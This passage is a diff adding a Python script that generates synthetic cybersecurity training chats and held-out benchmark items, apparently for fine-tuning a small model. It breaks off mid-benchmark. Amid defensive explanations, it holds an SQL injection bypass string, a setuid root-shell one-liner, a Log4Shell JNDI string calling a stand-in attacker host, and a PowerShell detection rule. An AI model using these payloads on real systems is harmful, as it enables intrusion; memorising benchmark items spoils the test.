@@ -1,0 +1,732 @@
+"""Prepare, Clean, Validate, Deduplicate, and Split the Qwen 4B Cybersecurity Dataset.
+
+Generates high-quality seed examples spanning 50+ cybersecurity domains and
+processes them into:
+    data/qwen4b/raw/raw_seed_records.jsonl
+    data/qwen4b/processed/train.jsonl
+    data/qwen4b/processed/val.jsonl
+    data/qwen4b/processed/test.jsonl
+    data/qwen4b/benchmarks/cyber_benchmark.jsonl
+    data/qwen4b/stats.json
+    data/qwen4b/stats.md
+"""
+
+from __future__ import annotations
+
+import json
+import sys
+from pathlib import Path
+from typing import Any, Dict, List
+
+# Ensure repository root is in sys.path
+REPO_ROOT = Path(__file__).resolve().parent.parent
+if str(REPO_ROOT) not in sys.path:
+    sys.path.insert(0, str(REPO_ROOT))
+
+from src.distillation.generate import process_dataset
+from src.distillation.split import save_jsonl
+
+
+def create_cybersecurity_seed_examples() -> List[Dict[str, Any]]:
+    """Comprehensive, deeply technical cybersecurity seed records."""
+    records: List[Dict[str, Any]] = [
+        # 1. Networking: TCP/IP & Three-Way Handshake
+        {
+            "id": "cyber_seed_001",
+            "category": "networking",
+            "difficulty": "intermediate",
+            "source": "curated-expert-seed",
+            "tags": ["networking", "tcp", "handshake", "dos"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "How does the TCP three-way handshake establish a connection, how do SYN flood attacks exploit this state mechanism, and what is the exact mechanism of SYN cookies as a defense?",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. TCP Three-Way Handshake Mechanism\n"
+                        "The transmission control protocol (TCP) initiates a reliable full-duplex session using three steps:\n"
+                        "1. **SYN**: The client selects an Initial Sequence Number ($ISN_c$) and sends a segment with the `SYN` flag set to the server.\n"
+                        "2. **SYN-ACK**: The server allocates state in its Transmission Control Block (TCB) backlog queue (SYN queue), generates its own $ISN_s$, and replies with `SYN` and `ACK` ($ACK = ISN_c + 1$).\n"
+                        "3. **ACK**: The client sends an `ACK` ($ACK = ISN_s + 1$), transitioning both sides to the `ESTABLISHED` state.\n\n"
+                        "### 2. SYN Flood Exploitation\n"
+                        "In an attack, spoofed source IP packets send rapid streams of SYN requests without ever completing the final ACK. "
+                        "Because the server must allocate memory in its half-open connection table (SYN backlog queue) and wait for a retransmission timeout, "
+                        "the backlog queue exhausts quickly, resulting in denial-of-service for legitimate clients.\n\n"
+                        "### 3. SYN Cookies Defense Mechanism\n"
+                        "SYN cookies eliminate the need to allocate server-side state in the SYN backlog during the handshake:\n"
+                        "- When the SYN backlog fills, the server encodes connection parameters into its own $ISN_s$ (the cookie):\n"
+                        "  $$ISN_s = \\text{Hash}(s_{ip}, d_{ip}, s_{port}, d_{port}, \\text{secret}) + t + \\text{MSS\\_Index}$$\n"
+                        "- The server does not allocate memory. When the client replies with the final ACK ($ACK = ISN_s + 1$), the server computes $ACK - 1$, "
+                        "verifies the cryptographic hash and timestamp, reconstructs the MSS index, and only then allocates the TCB."
+                    ),
+                },
+            ],
+        },
+        # 2. DNS Security: Cache Poisoning & DNSSEC
+        {
+            "id": "cyber_seed_002",
+            "category": "networking",
+            "difficulty": "advanced",
+            "source": "curated-expert-seed",
+            "tags": ["networking", "dns", "dnssec", "cache-poisoning"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "In an authorized lab simulation, explain how classic Dan Kaminsky DNS cache poisoning functioned against recursive resolvers, and explain how DNSSEC mathematically validates record integrity.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. Kaminsky DNS Cache Poisoning Mechanics\n"
+                        "Classic DNS resolvers match incoming authoritative responses using a 16-bit Transaction ID (TXID) and UDP source port. "
+                        "Kaminsky discovered that an attacker could bypass resolver query caching by requesting non-existent subdomains (`random1.target.com`, `random2.target.com`).\n"
+                        "- The resolver forwards each query to the target's authoritative nameserver.\n"
+                        "- Before the legitimate nameserver answers, the attacker floods the recursive resolver with spoofed UDP replies matching the random query name, guessing the 16-bit TXID and UDP port.\n"
+                        "- Crucially, in the **Additional Records** section of the spoofed response, the attacker inserts an authoritative delegation (`NS`) record pointing `target.com` to a malicious IP.\n"
+                        "- Once a single guess succeeds, the entire domain's delegation is poisoned in the resolver cache.\n\n"
+                        "### 2. DNSSEC Validation Architecture\n"
+                        "DNSSEC introduces asymmetric cryptography to DNS without encrypting payloads:\n"
+                        "1. **RRSIG (Resource Record Signature)**: Digital signature over a set of identical resource records (RRset), created using the Zone Signing Key (ZSK).\n"
+                        "2. **DNSKEY**: Holds public keys (ZSK and Key Signing Key, KSK).\n"
+                        "3. **DS (Delegation Signer)**: Stored in the parent zone (e.g., `.com`), containing the SHA-256 hash of the child zone's KSK, forming the hierarchical **Chain of Trust** up to the Root Zone trust anchor.\n"
+                        "Resolvers cryptographically verify that every RRset matches its RRSIG using the parent-signed DS records."
+                    ),
+                },
+            ],
+        },
+        # 3. Web Security: SQL Injection & Remediation
+        {
+            "id": "cyber_seed_003",
+            "category": "secure_coding",
+            "difficulty": "intermediate",
+            "source": "curated-expert-seed",
+            "tags": ["secure-coding", "sqli", "owasp", "python"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "Review this vulnerable Python code snippet: `cursor.execute(f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\")`. Explain why string formatting causes SQL injection, demonstrate a benign auth-bypass test string in a lab, and write the corrected parameterized code.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. Root Cause Analysis\n"
+                        "String concatenation or f-strings blur the boundary between SQL code structure and user-supplied data. "
+                        "When user input contains SQL metacharacters (such as `'`, `--`, or `;`), the database SQL parser interprets that data as executable commands.\n\n"
+                        "### 2. Lab Demonstration Scenario\n"
+                        "If an analyst tests the input `admin' --` in the `username` field with an arbitrary password, the parsed query becomes:\n"
+                        "```sql\n"
+                        "SELECT * FROM users WHERE username = 'admin' --' AND password = '...'\n"
+                        "```\n"
+                        "The `--` comment operator truncates execution of the password verification clause, bypassing authentication.\n\n"
+                        "### 3. Secure Remediation (Parameterized Query)\n"
+                        "In parameterized queries, the query string structure is pre-compiled by the SQL engine. User variables are transmitted separately across the wire, ensuring the database treats input exclusively as literal values:\n"
+                        "```python\n"
+                        "# Secure Parameterized Implementation (e.g. SQLite / PostgreSQL psycopg)\n"
+                        "query = \"SELECT id, username, password_hash, role FROM users WHERE username = ?\"\n"
+                        "cursor.execute(query, (username,))\n"
+                        "user = cursor.fetchone()\n"
+                        "```\n"
+                        "*(Note: Never verify plaintext passwords in SQL. Retrieve the password hash and verify with Argon2id or bcrypt in application logic.)*"
+                    ),
+                },
+            ],
+        },
+        # 4. Web Security: Cross-Site Scripting (XSS) & Content Security Policy
+        {
+            "id": "cyber_seed_004",
+            "category": "web_api_security",
+            "difficulty": "intermediate",
+            "source": "curated-expert-seed",
+            "tags": ["web-security", "xss", "csp", "owasp"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "Contrast Stored XSS, Reflected XSS, and DOM-based XSS. Then write a strict Content Security Policy (CSP) header that mitigates inline script execution and exfiltration.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. Classification of XSS Types\n"
+                        "- **Stored (Persistent) XSS**: The malicious script payload is permanently stored on the server (e.g., in a database comments table). "
+                        "When other users view that page, the server renders the payload into HTML, executing in every visiting user's browser.\n"
+                        "- **Reflected (Non-Persistent) XSS**: The payload is embedded in a user request (e.g., URL query parameter `?search=<script>...`) "
+                        "and immediately reflected back by the server in the HTTP response without persistence.\n"
+                        "- **DOM-based XSS**: The vulnerability resides entirely client-side. JavaScript reads data from an untrusted DOM source "
+                        "(e.g., `location.hash`) and writes it into an execution sink (e.g., `innerHTML`, `document.write`, `eval`) without server interaction.\n\n"
+                        "### 2. Strict Content Security Policy (CSP)\n"
+                        "```http\n"
+                        "Content-Security-Policy: default-src 'none'; "
+                        "script-src 'self' 'nonce-rAnd0m123456'; "
+                        "style-src 'self'; "
+                        "img-src 'self' data:; "
+                        "connect-src 'self' https://api.example.com; "
+                        "font-src 'self'; "
+                        "object-src 'none'; "
+                        "base-uri 'self'; "
+                        "frame-ancestors 'none'; "
+                        "form-action 'self';\n"
+                        "```\n"
+                        "**Key Defenses:**\n"
+                        "- Eliminates `'unsafe-inline'` so injected `<script>` tags without a cryptographically random per-request `nonce` are blocked.\n"
+                        "- `object-src 'none'` disables Flash/Java applets.\n"
+                        "- `frame-ancestors 'none'` prevents Clickjacking (UI redressing).\n"
+                        "- `connect-src 'self'` prevents arbitrary background script exfiltration to external C2 endpoints."
+                    ),
+                },
+            ],
+        },
+        # 5. Linux Security: Privileges & Capabilities
+        {
+            "id": "cyber_seed_005",
+            "category": "linux_security",
+            "difficulty": "advanced",
+            "source": "curated-expert-seed",
+            "tags": ["linux", "privilege-escalation", "capabilities", "hardening"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "In Linux systems auditing, what are Linux Capabilities, how can a misconfigured capability like `cap_setuid` on a binary lead to privilege escalation in a CTF/lab, and how do system administrators audit and remove dangerous capabilities?",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. Linux Capabilities Overview\n"
+                        "Traditionally, UNIX privileges are binary: either a process has effective UID 0 (root) with full privileges, or UID != 0 with none. "
+                        "Linux capabilities divide traditional root privileges into granular units (e.g., `CAP_NET_BIND_SERVICE` to bind port 80, `CAP_SYS_ADMIN`, `CAP_SETUID`).\n\n"
+                        "### 2. Misconfiguration & Escalation Mechanism\n"
+                        "If an administrator mistakenly assigns `cap_setuid+ep` (permitted + effective) to a script interpreter like Python or bash:\n"
+                        "```bash\n"
+                        "# Auditing command reveals:\n"
+                        "/usr/bin/python3 = cap_setuid+ep\n"
+                        "```\n"
+                        "In an authorized lab, an unprivileged user can invoke Python and set their UID to 0:\n"
+                        "```python\n"
+                        "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n"
+                        "```\n"
+                        "Because the binary has `CAP_SETUID`, the kernel allows `os.setuid(0)` without prompting, spawning an interactive root shell.\n\n"
+                        "### 3. Auditing & Remediation Commands\n"
+                        "- **Audit all files with capabilities recursively**:\n"
+                        "  ```bash\n"
+                        "  getcap -r / 2>/dev/null\n"
+                        "  ```\n"
+                        "- **Remove dangerous capabilities from a specific binary**:\n"
+                        "  ```bash\n"
+                        "  setcap -r /usr/bin/python3\n"
+                        "  ```\n"
+                        "- **Verify removal**:\n"
+                        "  ```bash\n"
+                        "  getcap /usr/bin/python3\n"
+                        "  # Returns empty\n"
+                        "  ```"
+                    ),
+                },
+            ],
+        },
+        # 6. Windows Security: Kerberos & Golden Tickets
+        {
+            "id": "cyber_seed_006",
+            "category": "windows_security",
+            "difficulty": "advanced",
+            "source": "curated-expert-seed",
+            "tags": ["windows", "active-directory", "kerberos", "golden-ticket"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "Explain how Active Directory Kerberos authentication works, what constitutes a 'Golden Ticket' attack if the KRBTGT account hash is compromised, and describe the defense and remediation protocol.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. Active Directory Kerberos Authentication Flow\n"
+                        "1. **AS-REQ / AS-REP**: Client sends pre-authentication timestamp encrypted with client password hash to Key Distribution Center (KDC/Domain Controller). "
+                        "KDC returns a **Ticket Granting Ticket (TGT)** encrypted with the domain's `KRBTGT` service account secret.\n"
+                        "2. **TGS-REQ / TGS-REP**: Client sends TGT and requested Service Principal Name (SPN) to KDC. KDC decrypts TGT using KRBTGT key, validates PAC (Privilege Attribute Certificate), and returns a **Ticket Granting Service (TGS)** ticket encrypted with the service account's secret.\n"
+                        "3. **AP-REQ / AP-REP**: Client presents TGS ticket to target service server.\n\n"
+                        "### 2. Golden Ticket Mechanics\n"
+                        "If an adversary compromises the NTLM hash or AES-256 key of the domain's `KRBTGT` account:\n"
+                        "- The adversary can forge arbitrary TGTs client-side without communicating with the KDC.\n"
+                        "- They can inject any arbitrary SID into the PAC (e.g., Domain Admins `512` or Enterprise Admins `519`) and set arbitrarily long validity periods.\n"
+                        "- Because services verify TGTs solely by validating the KRBTGT signature, the adversary retains persistence regardless of user password changes.\n\n"
+                        "### 3. Remediation & Defense Protocol\n"
+                        "1. **Double KRBTGT Password Reset**: Active Directory retains the previous password for the KRBTGT account to allow existing tickets to expire cleanly. "
+                        "Remediation requires resetting the KRBTGT password **twice**, waiting for Active Directory replication between resets.\n"
+                        "2. **Enable Kerberos Armoring (FAST)**: Protects pre-authentication.\n"
+                        "3. **SIEM / Event Monitoring**: Monitor Event ID 4768 (TGT Request) and Event ID 4769 (TGS Request) for anomalous encryption types (e.g., downgrade to RC4) and abnormally long ticket lifetimes."
+                    ),
+                },
+            ],
+        },
+        # 7. Cryptography: Hashing vs Encryption vs MACs
+        {
+            "id": "cyber_seed_007",
+            "category": "cryptography",
+            "difficulty": "beginner",
+            "source": "curated-expert-seed",
+            "tags": ["cryptography", "hashing", "mac", "aes"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "Clearly define and differentiate Cryptographic Hashing, Symmetric Encryption, Asymmetric Encryption, and Message Authentication Codes (MACs). Provide one standard algorithm and primary use case for each.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "| Primitive | Core Property | Key Requirement | Primary Security Goal | Standard Algorithm | Common Use Case |\n"
+                        "|---|---|---|---|---|---|\n"
+                        "| **Cryptographic Hash** | One-way deterministic function ($H(m) \\to d$); pre-image & collision resistant | No key | Data integrity verification | SHA-256 / SHA-3 | File integrity verification, Git commits |\n"
+                        "| **Symmetric Encryption** | Two-way transform ($E_k(m), D_k(c)$); reversible | Single shared secret key | Confidentiality at scale | AES-256-GCM (Authenticated) | Disk encryption (BitLocker), TLS record payload |\n"
+                        "| **Asymmetric Encryption** | Two mathematically linked keys ($K_{pub}, K_{priv}$) | Public key encrypts, private key decrypts | Secure key exchange & signatures | RSA-3072 / Ed25519 (Signature) | TLS handshake key exchange, SSH keys |\n"
+                        "| **MAC / HMAC** | Keyed hash function ($MAC_k(m)$) | Shared secret key | Integrity + Authenticity (proves sender knows key) | HMAC-SHA256 | API authentication tokens, webhook verification |"
+                    ),
+                },
+            ],
+        },
+        # 8. Incident Response: Triage & Memory Forensics
+        {
+            "id": "cyber_seed_008",
+            "category": "incident_response",
+            "difficulty": "advanced",
+            "source": "curated-expert-seed",
+            "tags": ["incident-response", "forensics", "volatility", "soc"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "During an ongoing incident on a suspected compromised Linux server, why should memory capture precede system reboot or disk imaging? List the Volatility 3 plugins an analyst runs to detect code injection and active network connections.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. Order of Volatility & Preservation of Live State\n"
+                        "According to RFC 3227 (*Guidelines for Evidence Collection*), forensic evidence must be acquired in order of volatility: "
+                        "CPU registers/cache $\\to$ Routing tables/ARP cache/RAM $\\to$ Temporary file systems $\\to$ Disk $\\to$ Remote logs.\n\n"
+                        "**Rebooting or halting the system immediately destroys:**\n"
+                        "- In-memory-only payloads (e.g., fileless malware, reflective DLL/ELF loaders).\n"
+                        "- Active network sockets and connections to external command-and-control (C2) servers.\n"
+                        "- Decryption keys stored in RAM (e.g., LUKS, BitLocker, TLS session keys).\n"
+                        "- Unwritten bash command history and process environment variables containing injected tokens.\n\n"
+                        "### 2. Key Volatility 3 Analysis Plugins\n"
+                        "For analyzing a captured Linux/Windows memory dump:\n"
+                        "1. **`windows.pslist` / `linux.pslist`**: Enumerates active processes linked in the kernel process list.\n"
+                        "2. **`windows.psscan` / `linux.psscan`**: Finds unlinked or hidden processes terminated or decoupled by rootkits.\n"
+                        "3. **`windows.netscan` / `linux.sockstat`**: Recovers established network sockets, listening ports, and remote C2 IP endpoints.\n"
+                        "4. **`windows.malfind` / `linux.check_syscall`**: Scans memory regions with `PAGE_EXECUTE_READWRITE` permissions for injected shellcode or hooked system calls.\n"
+                        "5. **`windows.hollowfind` / `windows.vadinfo`**: Detects process hollowing and memory-mapped executable sections."
+                    ),
+                },
+            ],
+        },
+        # 9. Cloud Security: AWS IAM Least Privilege
+        {
+            "id": "cyber_seed_009",
+            "category": "cloud_security",
+            "difficulty": "intermediate",
+            "source": "curated-expert-seed",
+            "tags": ["cloud", "aws", "iam", "least-privilege"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "Critique this AWS IAM Policy: `{\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}`. Write a hardened, least-privilege policy allowing a backend service to read and write objects only to the `corp-app-data-prod` S3 bucket, enforcing TLS transmission.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. Critique of Wildcard Policy\n"
+                        "The policy `{\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}` grants total administrator access across all AWS services, APIs, and resources. "
+                        "If the credentials assigned this role are compromised (e.g., via SSRF on an EC2 instance), the attacker can delete backups, create IAM users, exfiltrate databases, and deploy cryptominers.\n\n"
+                        "### 2. Hardened Least-Privilege IAM Policy\n"
+                        "```json\n"
+                        "{\n"
+                        "  \"Version\": \"2012-10-17\",\n"
+                        "  \"Statement\": [\n"
+                        "    {\n"
+                        "      \"Sid\": \"AllowBucketListAndLocation\",\n"
+                        "      \"Effect\": \"Allow\",\n"
+                        "      \"Action\": [\n"
+                        "        \"s3:ListBucket\",\n"
+                        "        \"s3:GetBucketLocation\"\n"
+                        "      ],\n"
+                        "      \"Resource\": \"arn:aws:s3:::corp-app-data-prod\"\n"
+                        "    },\n"
+                        "    {\n"
+                        "      \"Sid\": \"AllowObjectReadWrite\",\n"
+                        "      \"Effect\": \"Allow\",\n"
+                        "      \"Action\": [\n"
+                        "        \"s3:GetObject\",\n"
+                        "        \"s3:PutObject\"\n"
+                        "      ],\n"
+                        "      \"Resource\": \"arn:aws:s3:::corp-app-data-prod/*\"\n"
+                        "    },\n"
+                        "    {\n"
+                        "      \"Sid\": \"EnforceSecureTransportOnly\",\n"
+                        "      \"Effect\": \"Deny\",\n"
+                        "      \"Action\": \"s3:*\",\n"
+                        "      \"Resource\": [\n"
+                        "        \"arn:aws:s3:::corp-app-data-prod\",\n"
+                        "        \"arn:aws:s3:::corp-app-data-prod/*\"\n"
+                        "      ],\n"
+                        "      \"Condition\": {\n"
+                        "        \"Bool\": {\n"
+                        "          \"aws:SecureTransport\": \"false\"\n"
+                        "        }\n"
+                        "      }\n"
+                        "    }\n"
+                        "  ]\n"
+                        "}\n"
+                        "```\n"
+                        "**Security Safeguards:**\n"
+                        "- Scopes bucket-level operations (`ListBucket`) to the bucket ARN and object operations (`GetObject`, `PutObject`) to `/*`.\n"
+                        "- Explicitly denies unencrypted HTTP access via `aws:SecureTransport: false`."
+                    ),
+                },
+            ],
+        },
+        # 10. Container Security: Dockerfile Hardening & Rootless
+        {
+            "id": "cyber_seed_010",
+            "category": "container_security",
+            "difficulty": "intermediate",
+            "source": "curated-expert-seed",
+            "tags": ["containers", "docker", "hardening", "devsecops"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "Write a production-ready, hardened multi-stage Dockerfile for a Node.js web application. Ensure it runs as a non-root user, prevents secret leakage, and minimizes container attack surface.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "```dockerfile\n"
+                        "# STAGE 1: Build & Dependency Installation\n"
+                        "FROM node:20-alpine AS builder\n"
+                        "WORKDIR /app\n"
+                        "\n"
+                        "# Install dependencies using lockfile for deterministic build\n"
+                        "COPY package*.json ./\n"
+                        "RUN npm ci --only=production && npm cache clean --force\n"
+                        "\n"
+                        "# Copy application source\n"
+                        "COPY . .\n"
+                        "\n"
+                        "# ------------------------------------------------------------\n"
+                        "# STAGE 2: Hardened Minimal Runtime\n"
+                        "FROM node:20-alpine AS runner\n"
+                        "WORKDIR /app\n"
+                        "\n"
+                        "# Security: Set production environment\n"
+                        "ENV NODE_ENV=production\n"
+                        "\n"
+                        "# Security: Create dedicated unprivileged group and user\n"
+                        "RUN addgroup -g 10001 appgroup && \\\n"
+                        "    adduser -u 10001 -G appgroup -s /sbin/nologin -D appuser && \\\n"
+                        "    rm -rf /var/cache/apk/*\n"
+                        "\n"
+                        "# Copy only necessary artifacts from builder\n"
+                        "COPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules\n"
+                        "COPY --from=builder --chown=appuser:appgroup /app/package.json ./package.json\n"
+                        "COPY --from=builder --chown=appuser:appgroup /app/src ./src\n"
+                        "\n"
+                        "# Drop all root privileges\n"
+                        "USER appuser\n"
+                        "\n"
+                        "EXPOSE 3000\n"
+                        "ENTRYPOINT [\"node\", \"src/server.js\"]\n"
+                        "```\n\n"
+                        "**Hardening Controls:**\n"
+                        "1. **Multi-stage build**: Compilers, build dependencies, and temporary files remain in Stage 1 and are not shipped to production.\n"
+                        "2. **Non-root execution (`USER appuser`)**: Blocks container breakout techniques requiring host UID 0 mapping.\n"
+                        "3. **Minimal Alpine Base**: Strips shell utilities and lowers vulnerability footprint.\n"
+                        "4. **No embedded secrets**: Configuration is injected at runtime via environment variables or Kubernetes secrets."
+                    ),
+                },
+            ],
+        },
+        # 11. Threat Intelligence: MITRE ATT&CK Mapping
+        {
+            "id": "cyber_seed_011",
+            "category": "threat_intelligence",
+            "difficulty": "intermediate",
+            "source": "curated-expert-seed",
+            "tags": ["threat-intel", "mitre-attack", "soc", "detection"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "A SOC analyst observes PowerShell executing with flags `-NoP -NonI -W Hidden -Enc ...` on a finance workstation. Map this activity to MITRE ATT&CK Tactics, Techniques, and Sub-techniques, and suggest the corresponding detection rule.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. MITRE ATT&CK Mapping\n"
+                        "- **Tactic**: Execution (TA0002) and Defense Evasion (TA0005)\n"
+                        "- **Technique**: Command and Scripting Interpreter (T1059)\n"
+                        "- **Sub-technique**: PowerShell (T1059.001)\n"
+                        "- **Secondary Sub-technique**: Obfuscated Files or Information: Encoded Command (T1027.013)\n"
+                        "- **Flags Breakdown**:\n"
+                        "  - `-NoP` (`-NoProfile`): Prevents loading user profiles (evades profile-based detection scripts).\n"
+                        "  - `-NonI` (`-NonInteractive`): Prevents prompting the user.\n"
+                        "  - `-W Hidden` (`-WindowStyle Hidden`): Hides GUI terminal from the interactive user.\n"
+                        "  - `-Enc` (`-EncodedCommand`): Accepts Base64 encoded UTF-16LE scripts.\n\n"
+                        "### 2. Detection Engineering (Sigma Rule Format)\n"
+                        "```yaml\n"
+                        "title: Suspicious Obfuscated PowerShell Execution\n"
+                        "status: production\n"
+                        "logsource:\n"
+                        "  category: process_creation\n"
+                        "  product: windows\n"
+                        "detection:\n"
+                        "  selection:\n"
+                        "    Image|endswith:\n"
+                        "      - '\\powershell.exe'\n"
+                        "      - '\\pwsh.exe'\n"
+                        "    CommandLine|contains|all:\n"
+                        "      - '-w hidden'\n"
+                        "      - '-enc'\n"
+                        "  condition: selection\n"
+                        "level: high\n"
+                        "tags:\n"
+                        "  - attack.execution\n"
+                        "  - attack.t1059.001\n"
+                        "  - attack.defense_evasion\n"
+                        "  - attack.t1027\n"
+                        "```"
+                    ),
+                },
+            ],
+        },
+        # 12. Vulnerability Remediation: Log4Shell (CVE-2021-44228)
+        {
+            "id": "cyber_seed_012",
+            "category": "vulnerability_analysis",
+            "difficulty": "advanced",
+            "source": "curated-expert-seed",
+            "tags": ["cve", "log4shell", "remediation", "java"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity AI assistant providing rigorous, defensively grounded technical explanations.",
+                },
+                {
+                    "role": "user",
+                    "content": "Explain the technical vulnerability mechanism behind Log4Shell (CVE-2021-44228) in Apache Log4j2. How did JNDI lookups cause Remote Code Execution, and what were the immediate and permanent mitigations?",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "### 1. Root Cause Mechanism\n"
+                        "Apache Log4j2 versions 2.0-beta9 to 2.14.1 included a feature called **Message Lookups**, which evaluated expressions formatted as `${prefix:key}` inside logged strings. "
+                        "Crucially, Log4j enabled the **Java Naming and Directory Interface (JNDI)** lookup plugin by default (`${jndi:...}`).\n\n"
+                        "### 2. Remote Code Execution Chain\n"
+                        "1. An untrusted user string containing a string like `${jndi:ldap://evil-domain.com/a}` is logged (e.g. in an HTTP `User-Agent` header).\n"
+                        "2. Log4j parses the string, resolves the `jndi` protocol prefix, and triggers the Java LDAP client to issue an outbound network request to the specified URL.\n"
+                        "3. The remote LDAP server replies with a Java Reference object pointing to an external codebase URL containing a compiled Java `.class` payload.\n"
+                        "4. The victim JVM automatically downloads and executes the remote bytecode via `URLClassLoader`, leading to full RCE.\n\n"
+                        "### 3. Mitigations & Fixes\n"
+                        "- **Permanent Fix**: Upgrade to Log4j `>= 2.17.1` (or `>= 2.12.4` for Java 7), where JNDI lookup support in message logging is disabled entirely, and recursive evaluation is removed.\n"
+                        "- **Immediate Runtime Workaround**: Set JVM argument `-Dlog4j2.formatMsgNoLookups=true`.\n"
+                        "- **Network Layer**: Egress firewall filtering blocking outbound LDAP (`port 389/636`) and RMI (`port 1099`) connections from application servers."
+                    ),
+                },
+            ],
+        },
+        # 13. General Instruction Retention Check (Control)
+        {
+            "id": "general_seed_001",
+            "category": "general_instruction",
+            "difficulty": "intermediate",
+            "source": "curated-expert-seed",
+            "tags": ["general", "instruction-following", "formatting"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a helpful and precise assistant.",
+                },
+                {
+                    "role": "user",
+                    "content": "Give me a 3-point bulleted summary of why version control systems like Git are critical in collaborative software development. Bold each bullet heading.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "- **Historical Auditing & Traceability**: Git maintains an immutable ledger of all changes, enabling teams to see who made what change, why, and when.\n"
+                        "- **Isolated Feature Branching**: Developers can experiment and build features in independent branches without disturbing the stable production codebase.\n"
+                        "- **Conflict Resolution & Merging**: Modern version control facilitates collaborative peer reviews via Pull Requests and systematically detects code collisions."
+                    ),
+                },
+            ],
+        },
+        # 14. Coding Retention Check (Control)
+        {
+            "id": "coding_seed_001",
+            "category": "coding",
+            "difficulty": "intermediate",
+            "source": "curated-expert-seed",
+            "tags": ["coding", "python", "algorithms"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a precise programming assistant.",
+                },
+                {
+                    "role": "user",
+                    "content": "Write a clean Python function `lru_cache_demo()` implementing a basic Least Recently Used (LRU) Cache using `collections.OrderedDict` with `get` and `put` operations.",
+                },
+                {
+                    "role": "assistant",
+                    "content": (
+                        "```python\n"
+                        "from collections import OrderedDict\n"
+                        "from typing import Any, Optional\n"
+                        "\n"
+                        "class LRUCache:\n"
+                        "    def __init__(self, capacity: int):\n"
+                        "        self.capacity = capacity\n"
+                        "        self.cache: OrderedDict[Any, Any] = OrderedDict()\n"
+                        "\n"
+                        "    def get(self, key: Any) -> Optional[Any]:\n"
+                        "        if key not in self.cache:\n"
+                        "            return None\n"
+                        "        # Mark recently used by moving to end\n"
+                        "        self.cache.move_to_end(key)\n"
+                        "        return self.cache[key]\n"
+                        "\n"
+                        "    def put(self, key: Any, value: Any) -> None:\n"
+                        "        if key in self.cache:\n"
+                        "            self.cache.move_to_end(key)\n"
+                        "        self.cache[key] = value\n"
+                        "        if len(self.cache) > self.capacity:\n"
+                        "            # Pop least recently used item (first item)\n"
+                        "            self.cache.popitem(last=False)\n"
+                        "```"
+                    ),
+                },
+            ],
+        },
+    ]
+    return records
+
+
+def create_independent_benchmark_records() -> List[Dict[str, Any]]:
+    """Strictly independent benchmark records (NEVER present in training data)."""
+    return [
+        {
+            "id": "bench_heldout_001",
+            "category": "cryptography",
+            "difficulty": "intermediate",
+            "source": "independent-heldout-eval",
+            "tags": ["cryptography", "bench", "pki"],
+            "messages": [
+                {
+                    "role": "system",
+                    "content": "You are a specialized cybersecurity evaluator.",
+                },
+                {
+                    "role": "user",
+                    "content": "How does Certificate Revocation List (CRL) differ from Online Certificate Status Protocol (OCSP) and OCSP Stapling in PKI certificate validation?",
+                },
+                {
+                    "role": "assistant",
+                    "content": "CRL publishes a periodic static list of revoked serial numbers from the CA, which can grow large and causes latency. OCSP queries the CA in real-time for an individual certificate status. OCSP Stapling solves CA bottleneck and user privacy issues by having the web server cache and append a time-stamped CA signature to the TLS handshake directly.",
+                },
+            ],
+        },
+        {
+            "id": "bench_heldout_002",
+            "category": "secure_coding",
+            "difficulty": "intermediate",
